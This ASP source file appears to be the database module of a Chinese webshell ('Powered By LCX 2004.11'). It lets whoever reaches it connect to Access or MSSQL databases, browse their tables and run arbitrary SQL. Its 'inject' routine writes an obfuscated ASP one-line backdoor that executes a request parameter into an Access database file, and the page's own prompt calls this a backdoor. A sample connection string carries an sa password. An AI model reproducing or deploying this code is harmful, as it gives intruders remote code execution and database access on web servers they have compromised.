<%
	option explicit
%>
<!--#include file="config.asp"-->

<!-- PageSQL Below -->
<%
	pageSql()

	sub pageSql()
		isIn(2)
		dim theAct,sqlStr
		theAct=request("theAct")
		sqlStr=request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		if sqlStr="" then
			if session(m&"sqlStr")="" then
				sqlStr="e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 else
				sqlStr=session(m&"sqlStr")
			end if
		end if
		session(m&"sqlStr")=sqlStr
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=sql&theAct=showTables" onsubmit="this.Submit.disabled=true;">
  <tr> 
      <td height="22" align="center" class="td"><a href="?pageName=sql">mdb+mssql数据库操作</a></td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
      <td height="50" align="center" class="td"> 
        <input name="sqlStr" type="text" id="sqlStr" value="<%=sqlStr%>" size="60">
    </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
		<input type="submit" name="Submit" value="提 交">
		<input type="button" name="Submit2" value="插 入" onclick="if(confirm('这里是在ACESS数据里插入海阳顶端网ASP后门\n默认密码是<%=clientPassword%>\n后门插入后可以使用的前提是\n数据库是asp后缀,并且没有错乱asp代码\n确认操作吗?')){location.href='?pageName=sql&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}">
		<input type="button" name="Submit3" value="提 示" onClick="alert('插入只针对ACESS操作,\n要浏览ACESS在表单中的写法是,d:bbs.mdb\nSQL据库写法是,sql:连接字符串,不要忘写sql:')">
        <input name="button" type="button" onclick="this.form.sqlStr.value='e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';" value="示 例"> 
      </td>
  </tr>
</form>
</table>
<%
		select case theAct
			case "showTables"
				showTables()
			case "query"
				showQuery()
			case "inject"
				accessInject()
		end select
	
		showExecuteTime()
	end sub
	
	sub showTables()
		dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set conn=server.createObject("adodb.connection")
		
		on error resume next
		conn.open connStr
		chkErr err,encodeForUrl(err.description&"\n"&sqlStr,true)
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&enCodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
		rsTable.moveFirst
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">数据库表结构查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td valign="top" class="td"><%=tablesStr%><br> <br> </td>
    <td align="center" valign="top"><a href="<%="?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&""%>">转到SQL命令执行</a> 
      <%
		do until rsTable.eof
			set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
%>
      <br> 
      <table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="22" colspan="6" class="tr"><b><%=rsTable("Table_Name")%></b></td>
        </tr>
        <tr align="center"> 
          <td class="td">字段名</td>
          <td class="td">类型</td>
          <td class="td">大小</td>
          <td class="td">精度</td>
          <td class="td">允许为空</td>
          <td class="td">默认值</td>
        </tr>
        <%
			loopI=0
			do until rsColumn.eof
				loopI=loopI+1
				if loopI>sqlMaxLoopI then
					exit do
				end if
		%>
        <tr align="center" onmouseout="this.className='';" onmouseover="this.className='td';"> 
          <td align="left">&nbsp;<%=rsColumn("Column_Name")%></td>
          <td width="80"><%=getDataType(rsColumn("Data_Type"))%></td>
          <td width="70"><%=rsColumn("Character_Maximum_Length")%></td>

          <td width="70"><%=rsColumn("Numeric_Precision")%></td>
          <td width="70"><%=rsColumn("Is_Nullable")%></td>
          <td width="80"><%=rsColumn("Column_Default")%></td>
        </tr>
        <%
				rsColumn.moveNext
			loop
		%>
      </table>
      <%
			rsTable.moveNext
		loop
%>
    </td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
  </tr>
</table>
<%
		conn.close
		set conn=nothing
		set rsTable=nothing
		set rsColumn=nothing
	end sub
	
	sub showQuery()
		dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
		sql=request("sql")
		page=request("page")
		sqlStr=request("sqlStr")
		theTable=request("theTable")
		
		if not isNumeric(page) or page="" then
			page=1
		end if
		
		if sql="" and theTable<>"" then
			sql="select top 10 * from ["&theTable&"]"
		end if
		
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")
	
		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&encodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>&sql=<%=enCodeForUrl(sql,false)%>">SQL命令执行及查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" action="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>">
    <tr> 
      <td width="150" valign="top" class="td"><%=tablesStr%><br> <br> </td>
      <td align="center" valign="top"><br> 
        <input name="sql" type="text" id="sql" value="<%=server.htmlEncode(sql)%>" size="60"> 
        <input type="submit" name="Submit4" value="执行查询"> <br> 
        <%
		if sql<>"" and left(lcase(sql),7)="select " then
			rs.open sql,conn,1,1
			chkErr err,encodeForUrl("错误信息: "&err.description,false)
			rs.pageSize=20
			if not rs.eof then
				rs.absolutePage=page
			end if
			if rs.fields.count>0 then
				echo "<br><table border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan="""&rs.fields.count&""">SQL操作 - 执行结果</td>"
				echo "</tr>"
				echo "<tr>"
				for j=0 to rs.fields.count-1
					echo "<td height=""22"" align=""center"" class=""td""> "&rs.fields(j).name&" </td>"
				next
				for i=1 to 20
					if rs.eof then
						exit for
					end if
					echo "</tr>"
					echo "<tr onmouseover=""javascript:this.className='td';"" onmouseout=""javascript:this.className='';"" valign=top>"
					for j=0 to rs.fields.count-1
						echo "<td height=""22"" align=""center"">"&server.htmlEncode(fixNull(rs(j)))&"</td>"
					next
					echo "</tr>"
					rs.movenext
				next
			end if
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan="""&rs.fields.count&""">"
			for i=1 to rs.pagecount
				echo replace("<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&sql="&sql&"&page="&i&"""><font {$font"&i&"}>"&i&"</font></a> ","{$font"&page&"}","class=warningColor")
			next
			echo "</td></tr></table><br>"
			rs.close
		 else
		 	if sql<>"" then
				on error resume next
				conn.execute(sql)
				chkErr err,encodeForUrl(err.description&sql,false)
				echo "<center><br>执行完毕!</center>"
			end if
		end if
%>
      </td>
    </tr>
    <tr align="right"> 
      <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
    </tr>
  </form>
</table>
<br>
<%		
		conn.close
		set rs=nothing
		set conn=nothing
		set rsTable=nothing
	end sub
	
	function getDataType(typeId)
		select case typeId
			case 130
				getDataType="文本"
			case 2
				getDataType="整型"
			case 3
				getDataType="长整型"
			case 7
				getDataType="日期/时间"
			case 5
				getDataType="双精度型"
			case 11
				getDataType="是/否"
			case 128
				getDataType="OLE 对象"
			case else
				getDataType=typeId
		end select
	end function
	
	sub accessInject()
		dim rs,conn,sqlStr,connStr
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			onErr("插入只对ACCESS数据库有效!")
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")

		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr

		if notdownloadsExists=true then
			conn.execute("drop table notdownloads")
		end if

		conn.execute("create table notdownloads(notdownloads oleobject)")

		rs.open "notdownloads",conn,1,3
		rs.addnew
		rs("notdownloads").appendchunk(chrB(asc("<"))&chrB(asc("%"))&chrB(asc("e"))&chrB(asc("x"))&chrB(asc("e"))&chrB(asc("c"))&chrB(asc("u"))&chrB(asc("t"))&chrB(asc("e"))&chrB(asc("("))&chrB(asc("r"))&chrB(asc("e"))&chrB(asc("q"))&chrB(asc("u"))&chrB(asc("e"))&chrB(asc("s"))&chrB(asc("t"))&chrB(asc("("))&chrB(asc(""""))&chrB(asc(clientPassword))&chrB(asc(""""))&chrB(asc(")"))&chrB(asc(")"))&chrB(asc("%"))&chrB(asc(">"))&chrB(asc(" ")))
	    rs.update
    	rs.close
		
		echo "<script language=""javascript"">alert('插入成功!');history.back();</script>"
		
		conn.close
		set rs=nothing
		set conn=nothing
	end sub
%>
